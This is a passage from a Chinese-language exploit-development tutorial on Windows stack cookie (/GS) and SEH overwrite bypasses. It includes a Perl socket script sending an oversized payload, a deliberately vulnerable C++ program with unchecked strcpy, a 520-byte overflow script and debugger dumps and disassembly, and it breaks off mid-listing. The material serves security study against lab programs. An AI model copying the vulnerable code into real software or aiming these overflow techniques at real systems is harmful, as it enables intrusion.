# get the port addressmy $iaddr = inet_aton($host);
my $paddr = sockaddr_in($port, $iaddr);
print "[+] Setting up socket\n";
# create the socket, connect to the portsocket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die
"socket: $!";
print "[+] Connecting to $host on port $port\n";
connect(SOCKET, $paddr) or die "connect: $!";
print "[+] Sending payload\n";
print SOCKET $junk."\n";
print "[+] Payload sent\n";
close SOCKET or die "close: $!";
下边就是调试器中发生的情况（已经在vulnerable_server!__security_check_cookie上设置断点。）:
0:000> g
ModLoad: 71a50000 71a8f000 C:\WINDOWS\system32\mswsock.dll
ModLoad: 662b0000 66308000 C:\WINDOWS\system32\hnetcfg.dll
ModLoad: 77f10000 77f59000 C:\WINDOWS\system32\GDI32.dll
ModLoad: 7e410000 7e4a1000 C:\WINDOWS\system32\USER32.dll
ModLoad: 76390000 763ad000 C:\WINDOWS\system32\IMM32.DLL
ModLoad: 71a90000 71a98000 C:\WINDOWS\System32\wshtcpip.dll
Breakpoint 0 hit
eax=0012e46e ebx=00000000 ecx=4153a31d edx=0012e400 esi=00000001 edi=00403384
eip=004012dd esp=0012e048 ebp=0012e25c iopl=0
nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
vulnerable_server!__security_check_cookie:
004012dd 3b0d00304000 cmp ecx,dword ptr
[vulnerable_server!__security_cookie (00403000)] ds:0023:00403000=ef793df6
这里说明了程序会对安全cookie进行比较验证。
安全cookie被保存在地址0×00403000上
0:000> dd 0x00403000
00403000 ef793df6 1086c209 ffffffff ffffffff
00403010 fffffffe 00000001 00000000 00000000
00403020 00000001 00342a00 00342980 00000000
00403030 00000000 00000000 00000000 00000000
因为我们覆盖了堆栈的一部分（包括GS cookie）,导致对cookie的验证失败，接着函数FastSystemCallRet
被调用。
重新运行这个漏洞程序，再次运行perl代码对其进行攻击，并查看cookie（验证是否改变）:
(480.fb0): Break instruction exception - code 80000003 (first chance)
eax=00251eb4 ebx=7ffd9000 ecx=00000002 edx=00000004 esi=00251f48 edi=00251eb4
eip=7c90120e esp=0012fb20 ebp=0012fc94 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
ntdll!DbgBreakPoint:
7c90120e cc int 3
0:000> bp vulnerable_server!__security_check_cookie
0:000> bl
0 e 004012dd 0001 (0001) 0:**** vulnerable_server!__security_check_cookie
0:000> g
ModLoad: 71a50000 71a8f000 C:\WINDOWS\system32\mswsock.dll
ModLoad: 662b0000 66308000 C:\WINDOWS\system32\hnetcfg.dll
ModLoad: 77f10000 77f59000 C:\WINDOWS\system32\GDI32.dll
ModLoad: 7e410000 7e4a1000 C:\WINDOWS\system32\USER32.dll
ModLoad: 76390000 763ad000 C:\WINDOWS\system32\IMM32.DLL
ModLoad: 71a90000 71a98000 C:\WINDOWS\System32\wshtcpip.dll
Breakpoint 0 hit
eax=0012e46e ebx=00000000 ecx=4153a31d edx=0012e400 esi=00000001 edi=00403384
eip=004012dd esp=0012e048 ebp=0012e25c iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
vulnerable_server!__security_check_cookie:
004012dd 3b0d00304000 cmp ecx,dword ptr [vulnerable_server!__security_cookie
(00403000)] ds:0023:00403000=d0dd8743
0:000> dd 0x00403000
00403000 d0dd8743 2f2278bc ffffffff ffffffff
00403010 fffffffe 00000001 00000000 00000000
00403020 00000001 00342a00 00342980 00000000
00403030 00000000 00000000 00000000 00000000
它们是不同的，这意味着它是不可预测的，（这是经常会发生的。（MS06 – 040的利用就展示了一个可
以利用这种静态Cookie的事实，因此它在理论上是可能的。）
不管怎么溢出缓冲区,应用程序都会挂在这里:ntdll!KiFastSystemCallRet
(在函数pr()上设置断点，并单步跟踪直到对安全cookie的检查失败（在函数返回之前）)
关于/GS选项对于防止缓冲区溢出而对代码所做的更改，在这里给出了足够的信息。
如前所述，有一些绕过 GS保护的技术，它们大多数基于一个事实---你能覆盖到异常处理结构并能在
cookie被检查前触发异常，其他依赖的是能够写入参数…我做了很多尝试，但针对这个程序的 exploit
始终没有成功（不能覆盖异常处理器），因此看上去/GS对这个程序的保护还是相当有效的。
绕过栈中的cookie演示1:异常处理
漏洞代码
我们使用下边的c++代码(basicbof.cpp) 来演示如何绕过堆栈中的cookie:
#include "stdafx.h"
#include "stdio.h"
#include "windows.h"
void GetInput(char* str, char* out)
{
char buffer[500];
try
{
strcpy(buffer,str);
strcpy(out,buffer);
printf("Input received : %s\n",buffer);
}
catch (char * strErr)
{
printf("No valid input received ! \n");
printf("Exception : %s\n",strErr);
}
}
int main(int argc, char* argv[])
{
char buf2[128];
GetInput(argv[1],buf2);
return 0;
}
如你所见，函数GetInput中包含一个存在漏洞的拷贝函数，因为在拷贝前它并没有检查参数的长度，此
外，一旦“buffer”被填满（可能损坏），在函数返回前它又被拷贝到 out中，但是 哈-如果有恶意输入
这个函数的异常处理应该发出警告，对吧 ?:-)
关闭/GS和RTC来编译代码。
使用１０个字符作为参数运行程序:
basicbof.exe AAAAAAAAAA
Input received : AAAAAAAAAA
对吧，上边这个实验和我们预期的一样，现在用500多个字符作为参数启动这个程序。应用程序崩溃了。
（如果你去掉GetInput中的异常处理器，应用程序会崩溃并陷入调试器。）
我们使用下边的perl脚本来用520个字符作为参数调用程序。
my $buffer="A" x 520;
system("\"C:\\Program Files\\Debugging Tools for Windows (x86)\\windbg\" basicbof.exe
\"$buffer\"\r\n");
运行这个脚本：
(908.470): Access violation - code c0000005 (!!! second chance !!!)
eax=0000021a ebx=00000000 ecx=7855215c edx=785bbb60 esi=00000001 edi=00403380
eip=41414141 esp=0012ff78 ebp=41414141 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
41414141 ??
 直接覆盖掉了返回地址/eip,这是经典的缓冲区溢出。
如果在安装有异常处理器的程序上尝试同样的操作，应用程序会挂掉，（如果你喜欢在windbg中执行程
序，也可以用windbg启动basicbof.exe，并用500多个字符做为它的参数。）
现在我们得到这样的结果:
(b5c.964): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012fd41 ebx=00000000 ecx=0012fd41 edx=00130000 esi=00000001 edi=004033a8
eip=004010cb esp=0012fcb4 ebp=0012feec iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206
basicbof!GetInput+0xcb:
004010cb 8802 mov byte ptr [edx],al ds:0023:00130000=41
返回地址没有被覆盖，而异常处理器被覆盖掉了。
0:000> !exchain
0012fee0: 41414141
Invalid exception stack at 41414141
当异常处理器被溢出时，它是如何工作的？发生了什么？
在继续之前，做个小实验（使用断点跟踪），我们会了解到通过溢出覆盖掉异常处理器之后，为什么程序
抛出了异常？会在什么时候抛出异常？
用windbg（把程序参数设置成520个A）打开程序（没有GS保护，但是安装了异常处理器），启动程序
前（在断点），在函数GetInput上设置断点。
0:000> bp GetInput
0:000> bl
0 e 00401000 0001 (0001) 0:**** basicbof!GetInput
运行程序，当函数被调用时中断了下来。
Breakpoint 0 hit
eax=0012fefc ebx=00000000 ecx=00342980 edx=003429f3 esi=00000001 edi=004033a8
eip=00401000 esp=0012fef0 ebp=0012ff7c iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
basicbof!GetInput:
00401000 55 push ebp
如果你反汇编函数GetInput，你将看到:
00401000 $ 55 PUSH EBP ;save current value of EBP (=> saved EIP)
00401001 . 8BEC MOV EBP,ESP ;ebp is now top of stack (=> saved EBP)
00401003 . 6A FF PUSH -1
00401005 . 68 A01A4000 PUSH basicbof.00401AA0 ; SE handler installation
0040100A . 64:A1 00000000 MOV EAX,DWORD PTR FS:[0]
00401010 . 50 PUSH EAX
00401011 . 64:8925 000000>MOV DWORD PTR FS:[0],ESP
00401018 . 51 PUSH ECX
00401019 . 81EC 1C020000 SUB ESP,21C ;reserve space on the stack, 540 bytes
0040101F . 53 PUSH EBX
00401020 . 56 PUSH ESI
00401021 . 57 PUSH EDI
00401022 . 8965 F0 MOV DWORD PTR SS:[EBP-10],ESP
00401025 . C745 FC 000000>MOV DWORD PTR SS:[EBP-4],0
0040102C . 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8] ;start strcpy(buffer,str)
0040102F . 8985 F0FDFFFF MOV DWORD PTR SS:[EBP-210],EAX
00401035 . 8D8D F8FDFFFF LEA ECX,DWORD PTR SS:[EBP-208]
0040103B . 898D ECFDFFFF MOV DWORD PTR SS:[EBP-214],ECX
00401041 . 8B95 ECFDFFFF MOV EDX,DWORD PTR SS:[EBP-214]
00401047 . 8995 E8FDFFFF MOV DWORD PTR SS:[EBP-218],EDX
0040104D > 8B85 F0FDFFFF MOV EAX,DWORD PTR SS:[EBP-210]
00401053 . 8A08 MOV CL,BYTE PTR DS:[EAX]
00401055 . 888D E7FDFFFF MOV BYTE PTR SS:[EBP-219],CL
0040105B . 8B95 ECFDFFFF MOV EDX,DWORD PTR SS:[EBP-214]
00401061 . 8A85 E7FDFFFF MOV AL,BYTE PTR SS:[EBP-219]
00401067 . 8802 MOV BYTE PTR DS:[EDX],AL
00401069 . 8B8D F0FDFFFF MOV ECX,DWORD PTR SS:[EBP-210]
0040106F . 83C1 01 ADD ECX,1
00401072 . 898D F0FDFFFF MOV DWORD PTR SS:[EBP-210],ECX
00401078 . 8B95 ECFDFFFF MOV EDX,DWORD PTR SS:[EBP-214]
0040107E . 83C2 01 ADD EDX,1
00401081 . 8995 ECFDFFFF MOV DWORD PTR SS:[EBP-214],EDX
00401087 . 80BD E7FDFFFF >CMP BYTE PTR SS:[EBP-219],0
0040108E .^75 BD JNZ SHORT basicbof.0040104D ;jmp to 0x0040104d,get next char
00401090 . 8D85 F8FDFFFF LEA EAX,DWORD PTR SS:[EBP-208] ;start strcpy(out,buffer)
00401096 . 8985 E0FDFFFF MOV DWORD PTR SS:[EBP-220],EAX
0040109C . 8B4D 0C MOV ECX,DWORD PTR SS:[EBP+C]
0040109F . 898D DCFDFFFF MOV DWORD PTR SS:[EBP-224],ECX
004010A5 . 8B95 DCFDFFFF MOV EDX,DWORD PTR SS:[EBP-224]
004010AB . 8995 D8FDFFFF MOV DWORD PTR SS:[EBP-228],EDX
004010B1 > 8B85 E0FDFFFF MOV EAX,DWORD PTR SS:[EBP-220]
004010B7 . 8A08 MOV CL,BYTE PTR DS:[EAX]
004010B9 . 888D D7FDFFFF MOV BYTE PTR SS:[EBP-229],CL
004010BF . 8B95 DCFDFFFF MOV EDX,DWORD PTR SS:[EBP-224]